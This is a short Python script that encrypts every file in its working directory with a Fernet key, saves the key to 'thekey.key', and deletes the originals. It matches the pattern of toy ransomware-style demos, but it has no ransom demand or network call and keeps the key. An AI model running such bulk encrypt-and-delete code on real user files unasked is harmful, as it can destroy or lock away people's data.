import os
from cryptography.fernet import Fernet

# Files to ignore during encryption
exclude_files = {"encrypt.py", "decrypt.py", "thekey.key"}
files_to_encrypt = []

# Collect all non-encrypted files
for file in os.listdir():
    if file in exclude_files or file.endswith(".enc"):
        continue
    if os.path.isfile(file):
        files_to_encrypt.append(file)

# Generate and save a key
key = Fernet.generate_key()
with open("thekey.key", "wb") as key_file:
    key_file.write(key)

fernet = Fernet(key)

# Encrypt each file and save as .enc
for file in files_to_encrypt:
    with open(file, "rb") as f:
        original = f.read()
    encrypted = fernet.encrypt(original)
    with open(file + ".enc", "wb") as f:
        f.write(encrypted)
    os.remove(file)  # Delete the original file

print(f"{len(files_to_encrypt)} files have been encrypted.")